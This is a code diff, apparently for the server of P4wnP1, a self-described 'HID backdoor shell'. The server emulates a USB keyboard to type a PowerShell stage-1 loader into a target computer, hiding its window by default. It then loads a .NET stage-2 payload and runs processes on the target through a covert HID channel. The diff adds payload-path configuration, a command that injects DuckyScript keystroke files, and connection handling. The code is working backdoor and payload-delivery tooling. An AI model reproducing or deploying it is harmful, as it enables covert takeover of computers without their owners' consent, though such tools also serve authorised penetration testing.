@@ -2,6 +2,7 @@
 import time
 import cmd
 import sys
+import os
 import Queue
 import struct
 from pydispatch import dispatcher
@@ -14,6 +15,7 @@ from Config import Config
 from StageHelper import StageHelper
 from Channel import Channel
 from Client import *
+from FileSystem import FileSystem
 
 class P4wnP1(cmd.Cmd):
 	"""
@@ -21,7 +23,9 @@ class P4wnP1(cmd.Cmd):
 	... maybe not, who knows ?!
 	"""
 
-	DEBUG= False
+	DEBUG = False
+
+	CLIENT_TIMEOUT_MS = 1000 # if this value is reached, the client is regarded as disconnected
 
 	# message types from CLIENT (powershell) to server (python)
 	CTRL_MSG_FROM_CLIENT_RESERVED = 0
@@ -43,12 +47,14 @@ class P4wnP1(cmd.Cmd):
 	CTRL_MSG_FROM_SERVER_RUN_METHOD_RESPONSE = 1005 # response from a method ran on server
 	CTRL_MSG_FROM_SERVER_DESTROY = 1006 # response from a method ran on server
 
-	def __init__(self, linklayer, transportlayer, stage2 = "", duckencoder = None):
+	def __init__(self, linklayer, transportlayer, config,  stage2 = "", duckencoder = None):
 		# state value to inform sub threads of running state
 		self.running = False	
 		self.stage2=stage2
+		self.config =  config
 
 		self.client = Client() # object to monitor state of remote client
+		self.client.registerCallbackOnConnectChange(self.onClientConnectStateChange)
 
 		#self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")
 
@@ -64,12 +70,14 @@ class P4wnP1(cmd.Cmd):
 
 		self.duckencoder = duckencoder
 		
+		self.fs =  FileSystem()
 
 		# register Listener for LinkLayer signals to upper layers (to receive LinkLayer connection events)
-		dispatcher.connect(self.signale_handler_transport_layer, sender="TransportLayerUp")
-
+		dispatcher.connect(self.signale_handle_transport_layer, sender="TransportLayerUp")
+		self.setPrompt(False, False)
 		cmd.Cmd.__init__(self)
-		self.prompt = "P4wnP1 HID shell > "
+		
+		
 		self.intro = '''=================================
 P4wnP1 HID backdoor shell
 Author: MaMe82
@@ -79,7 +87,23 @@ State: Experimental (maybe forever ;-))
 Enter "help" for help
 Enter "FireStage1" to run stage 1 against the current target.
 Use "help FireStage1" to get more details.
-================================='''
+=================================
+'''
+
+	def setPrompt(self, connectState,  reprint = True):
+		if connectState:
+			self.prompt = "P4wnP1 shell (client connected) > "
+		else:
+			self.prompt = "P4wnP1 shell (client not connected) > "
+		if reprint:
+			self.print_reprompt()
+			
+	def print_reprompt(self, text = ""):
+		if len(text) > 0:
+			print text
+		sys.stdout.write(self.prompt)
+		sys.stdout.flush()
+		
 
 	@staticmethod
 	def print_debug(str):
@@ -135,7 +159,7 @@ Use "help FireStage1" to get more details.
 			except KeyboardInterrupt:
 				interacting = False
 				proc.setInteract(False)
-				print "Interaction stopped by keyboard interrupt"
+				print "\nInteraction stopped by keyboard interrupt.\nTo continue interaction use 'interact'."
 
 	#def addChannel(self, payload):
 		#'''
@@ -146,6 +170,13 @@ Use "help FireStage1" to get more details.
 
 		#P4wnP1.print_debug("Server add channel request. Channel id '{0}', type {1}, encoding {2}".format(ch_id, ch_type, ch_encoding))
 
+	def onClientConnectStateChange(self, state):
+		#print "Client connect state: {0}".format(state)
+		if state:
+			print "\nTarget connected through HID covert channel\n"
+		else:
+			print "\nTarget disconnected"
+		self.setPrompt(state)
 	
 	def onClientProcessExitted(self, payload):
 		# fetch proc id
@@ -153,7 +184,7 @@ Use "help FireStage1" to get more details.
 		proc = self.client.getProcess(proc_id)
 		if proc:
 			proc.hasExited = True
-			print "Proc with id {0} exited".format(proc_id)
+			self.print_reprompt("Proc with id {0} exited".format(proc_id))
 			if not proc.keepTillInteract:
 				self.client.removeProc(proc_id)
 	
@@ -240,6 +271,7 @@ Use "help FireStage1" to get more details.
 						self.client.setStage2("RECEIVED")
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING:
 						self.client.setStage2("RUNNING")
+						self.client.setConnected(True)
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE:
 						# handle method response
 						self.client.deliverMethodResponse(payload)
@@ -250,9 +282,11 @@ Use "help FireStage1" to get more details.
 					#elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_ADD_CHANNEL:
 						#self.addChannel(payload)
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE:
-						print "Client received kill request and tries to terminate."
+						self.print_reprompt("Client received terminates!")
+						self.client.setConnected(False)
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD:
-						print "Run method request with following payload received: {0} ".format(repr(payload))
+						#print "Run method request with following payload received: {0} ".format(repr(payload))
+						pass
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_PROCESS_EXITED:
 						self.onClientProcessExitted(payload)
 					else:
@@ -267,17 +301,21 @@ Use "help FireStage1" to get more details.
 
 
 	# loose definition, data argument has to be produced by LinkLayer
-	def signale_handler_transport_layer(self, signal, data):
-		P4wnP1.print_debug("LinkLayer signal: {0}".format(signal))
+	def signale_handle_transport_layer(self, signal, data):
+		P4wnP1.print_debug("TransportLayer signal: {0}".format(signal))
 
 		if signal == "TransportLayerClientConnectedLinkLayer":
 			# connection established
 			self.client.setLink(True)
 		elif signal == "TransportLayerConnectionResetLinkLayer":
+			#self.client.setConnected(False)
 			self.client.setLink(False)
 		elif signal == "TransportLayerConnectionTimeoutLinkLayer":
-			#self.client.setLink(False)
-			pass
+			if data >= P4wnP1.CLIENT_TIMEOUT_MS:
+				self.print_reprompt("\nClient didn't respond for {0} seconds.".format(data/1000))
+				self.ll.restart_background()
+				#self.client.setConnected(False)
+				self.client.setLink(False)
 		elif signal == "TransportLayerWaitingForClient" or signal == "TransportLayerSendStream":
 			# ignore these events
 			pass
@@ -350,10 +388,11 @@ Use "help FireStage1" to get more details.
 				
 			ps_script += "$USB_VID='{0}';$USB_PID='{1}';".format(vid, pid) 
 			
-			with open("Stage1.ps1","rb") as f:	
+			with open(self.config["PATH_STAGE1_PS"],"rb") as f:	
 				ps_script += StageHelper.out_PS_IEX_Invoker(f.read())
 		elif trigger_type == 2:
-			ps_script += StageHelper.out_PS_Stage1_invoker("Stage1.dll")
+			# slower .NET dll based stage 1
+			ps_script += StageHelper.out_PS_Stage1_invoker(self.config["PATH_STAGE1_DOTNET"])
 					
 		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
 		self.duckencoder.outhidStringDirect(ps_script + ";exit\n") # print stage1 PowerShell script			
@@ -606,7 +645,11 @@ Use "help FireStage1" to get more details.
 				trigger_delay_ms = int(args[1])
 			except ValueError:
 				print arg_error
-		self.stage1_trigger(trigger_type=trigger_type, trigger_delay_ms=trigger_delay_ms)	
+
+		hideTargetWindow = True
+		if "nohide" in line.lower():
+			hideTargetWindow = False
+		self.stage1_trigger(trigger_type=trigger_type, trigger_delay_ms=trigger_delay_ms, hideTargetWindow = hideTargetWindow)	
 				
 		
 	def do_SetKeyboardLanguage(self, line):
@@ -634,7 +677,10 @@ Use "help FireStage1" to get more details.
 			print "No process ID given, choose from:"
 			procs = self.client.getProcsWithChannel()
 			for p in procs:
-				print "{0}".format(p.id)
+				if p.hasExited:
+					print "{0} (exited, interact to see final output)".format(p.id)
+				else:
+					print "{0}".format(p.id)
 			return
 
 		try:
@@ -659,15 +705,83 @@ Use "help FireStage1" to get more details.
 	'''
 		
 		self.client_call_echo(line)
+		
+	def do_SendDuckyScript(self, line):
+		scriptpath = self.config["PATH_DUCKYSCRIPT"] +  "/" +  line
+		
+		if not self.fs.fileExists(scriptpath):
+			print "No script given or given script not found"
+			hasChosen =  False
+			scriptNum =  0
+			available_scripts =  self.fs.ls(self.config["PATH_DUCKYSCRIPT"])
+			while not hasChosen:
+				# print out available scripts
+				print "Choose script by number or name:"
+				print "================================\n"
+				for i in range(len(available_scripts)):
+					print "{0}:\t{1}".format(i, available_scripts[i])
 
+				given = raw_input("Your selection or 'x' to abort: ")
+				if given == "x":
+					print "abort ..."
+					return
+				# try to choose by name
+				if given in available_scripts:
+					scriptNum =  available_scripts.index(given)
+					hasChosen =  True
+					break
+				# try to choose by number
+				try:
+					scriptNum = int(given)
+					if scriptNum >= 0 and scriptNum < len(available_scripts):
+						hasChosen =  True
+						break
+					else:
+						print "Invalid input..."
+						continue						
+				except ValueError:
+					print "Invalid input..."
+					continue
+			
+			if hasChosen:
+				scriptpath = self.config["PATH_DUCKYSCRIPT"] +  "/" +  available_scripts[scriptNum]
+			else:
+				return
+		
+		# read in script
+		script = ""
+		with open(scriptpath, "r") as f:
+			script = f.read()
+			
+		# execute script
+		self.duckencoder.outhidDuckyScript(script)
+		
+	def do_lcd(self,  line):
+		print self.fs.cd(line)
+		
+	def do_lpwd(self,  line):
+		print self.fs.pwd()
+		
+	def do_lls(self,  line):
+		if len(line.strip()) >  0:
+			res = self.fs.ls_native2(line.split(" "))
+		else:
+			res = self.fs.ls_native2()
+		for l in res:
+			print l
 
 if __name__ == "__main__":
-	config = Config.conf_to_dict("config.txt")
+	rundir = os.path.dirname(sys.argv[0])
+	basedir = os.path.abspath(rundir) +  "/"
+		
+	config = Config.conf_to_dict(basedir + "/config.txt")
+	config["BASEDIR"] = basedir
+	# replace relative path'
+	for key in config:
+		if key.startswith("PATH_"):
+			config[key] = os.path.abspath(config["BASEDIR"] + config[key])
 
 	try:
-		#dev_file_in_path = "/dev/hidg1"
-		#dev_file_out_path = "/dev/hidg1"
-
 		dev_file_in_path = config["HID_RAW_DEV"]
 		dev_file_out_path = config["HID_RAW_DEV"]
 
@@ -689,18 +803,21 @@ if __name__ == "__main__":
 		enc.setKeyDevFile(config["HID_KEYBOARD_DEV"])
 		enc.setLanguage(config["KEYBOARD_LANG"])
 		
-		p4wnp1 = P4wnP1(ll, tl, duckencoder = enc)
-		#with open("stage2.ps1", "rb") as f:
-		with open("P4wnP1.dll", "rb") as f:
+		p4wnp1 = P4wnP1(ll, tl, config, duckencoder=enc)
+		with open(config["PATH_STAGE2_DOTNET"], "rb") as f:
 			p4wnp1.set_stage2(f.read())
 		p4wnp1.start() # starts link layer (waiting for initial connection) and server input thread
 		p4wnp1.cmdloop()
 
 	except:
+		import traceback
+		import exceptions
 		#print "Exception: " + str(type(e)) + ":"
 		#print "\t{}".format(e.message)
 		#exc_type, exc_obj, exc_tb = sys.exc_info()
 		#print "\tLine: {}".format(exc_tb.tb_lineno)
+		if sys.exc_type != exceptions.SystemExit:
+			traceback.print_exc()
 		raise
 	finally:
 
